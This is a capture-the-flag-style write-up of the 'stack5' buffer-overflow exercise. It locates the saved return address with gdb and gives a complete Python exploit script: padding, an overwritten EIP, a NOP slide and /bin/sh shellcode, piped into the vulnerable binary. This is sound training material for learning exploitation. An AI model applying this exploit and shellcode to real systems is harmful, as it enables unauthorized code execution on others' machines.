<h2>Goal</h2>
Create overflow, overwrite $EIP, insert shellcode. 

First find `$EIP` location so we know how far to overflow.

Break at `RET`. (break *main+22) Get `$ESP` value at this point using `info registers`.

Determine what is `$EIP` with same strategy as stack 4. 

Break at `RET`, single step, check `$EIP` value. Go back to break at leave (break *main+22) and print out the value of the stack in search of the value of `RET`.

What happens is, the stack is now AT the `$EIP` value that `RET` returns too.  So you over write the `$EIP` that `RET` returns too with its own address. 

I determine `$EIP` = `0xbffff7ac`

Often the address needs to be a bit after itself due to accuracy issues, this is why the NOP slide is used. Our payload will look like:


A's are used to fill the buffer, then the memory address of `$EIP`, NOP slide, then the shellcode.

```
 "A"*76 +  `0xbffff7ac` + NOPS + shellcode.
 ```

After EIP you write the code you want to run (shellcode). This often requires NOP slides though due to accuracy issues. Obtain shellcode from online. shell-storm website is good. 
I used this simple shellcode:

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`


Make python file for creating exploits. Makes for easy editing.

<h2>Solution</h2>
python script in /tmp/gen

```
import struct
jam="A"*76
addr=struct.pack("I", 0xbffff7ac+20)
nops="\x90"*50
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
payload= jam+ addr + nops + shellcode

print payload
```

Run it using the following:
`(python /tmp/gen ; cat) | ./stack5`

Sometimes 0xbffff7ac + 10 or +20 or +30 needed if 'illegal operation' error.
